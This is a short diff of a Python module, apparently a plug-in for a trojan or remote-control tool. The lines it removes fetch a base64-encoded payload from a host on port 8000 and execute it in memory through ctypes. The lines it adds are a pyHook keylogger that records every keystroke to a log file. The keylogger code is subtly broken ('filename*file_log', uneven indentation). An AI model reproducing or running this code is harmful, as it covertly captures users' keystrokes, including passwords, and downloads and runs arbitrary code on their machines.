@@ -1,14 +1,16 @@
-import urllib2
-import ctypes
-import base64
+import pyHook, pythoncom, sys, logging
+
 def run(**args):
   try:
-     url = "http://192.168.1.2:8000/file.bin"
-     response = urllib2.urlopen(url)
-     file = base64.b64decode(response.read())
-     file_buffer = ctypes.create_string_buffer(file, len(file))
-     file_func = ctypes.cast(file_buffer, ctypes.CFUNCTYPE
-     (ctypes.c_void_p))
-     file_func()
+     file_log='log.txt'
+     def OnKeyboardEvent(event):
+         logging.basicConfig(filename*file_log, level=logging.DEBUG, format='%(message)s')
+         chr(event.Ascii)
+         logging.log(10,chr(event.Ascii))
+          return True
+      hooks_manager = pyHook.HookManager ( )
+      hooks_manager.KeyDown = OnKeyboardEvent
+      hooks_manager.HookKeyboard ( )
+      pythoncom.PumpMessages () 
   except Exception, e:
       return str(e)
